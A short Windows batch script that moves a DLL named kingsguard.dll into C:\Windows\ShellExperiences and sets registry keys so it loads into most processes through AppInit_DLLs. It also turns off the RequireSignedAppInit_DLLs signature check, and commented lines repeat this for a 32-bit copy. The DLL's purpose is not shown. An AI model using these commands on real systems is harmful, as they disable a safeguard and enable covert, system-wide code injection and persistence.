move C:\users\administrator\desktop\kingsguard.dll C:\windows\shellexperiences 
@REM move C:\users\administrator\desktop\kingsguard32.dll C:\windows\shellexperiences
@REM reg delete "hklm\software\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\ShellExperiences\kingsguard.dll" /f
@REM reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
@REM reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\ShellExperiences\kingsguard32.dll" /f
